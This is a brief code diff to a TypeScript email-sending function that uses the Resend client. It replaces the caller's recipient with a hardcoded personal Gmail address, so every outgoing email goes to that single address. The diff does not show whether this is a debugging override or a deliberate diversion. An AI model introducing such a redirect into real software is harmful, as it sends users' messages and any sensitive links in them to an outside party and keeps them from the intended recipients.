@@ -22,7 +22,7 @@ export async function SendEmail({ to, subject, html }: SendEmailParams) {
   try {
     const { error } = await resend.emails.send({
       from,
-      to,
+      to: "zayyartun2842@gmail.com",
       subject,
       html,
     });
